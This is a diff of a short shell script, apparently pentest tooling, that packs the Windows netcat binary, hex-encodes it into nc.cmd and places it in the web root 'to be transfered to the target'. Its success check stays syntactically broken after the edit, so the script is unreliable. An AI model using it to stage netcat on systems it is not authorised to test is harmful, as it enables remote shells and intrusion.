@@ -15,15 +15,17 @@ then
 	sudo cp /usr/share/windows-resources/binaries/nc.exe .
 	upx -9 nc.exe
 	# Convert nc.exe to hex
-	exe2hex -x nc.exe -p nc.cmd
+	sudo exe2hex -x nc.exe -p /var/www/html/nc.cmd
 	# Copy the nc.cmd to the html file of the server.
-	sudo cp ./nc.cmd /var/www/html/
-	sudo rm ./nc.cmd ./nc.exe
+	#sudo cp ./nc.cmd /var/www/html/
+	#sudo rm ./nc.cmd ./nc.exe
 
 	validate= ls /var/www/html | grep "nc.cmd"
-	if [ $variable -n ]
+	if [ $validate -n ]
 	then
 		echo -e "######################################################################\nSuccess! /var/www/html/nc.cmd is ready to be transfered to the target! \n######################################################################"
+	else
+		echo "Failed to complete!"
 	fi
 elif [ $answer == 'n' ]
 then
@@ -36,4 +38,3 @@ else
 	echo "######################################################################"
 	exit
 fi
-
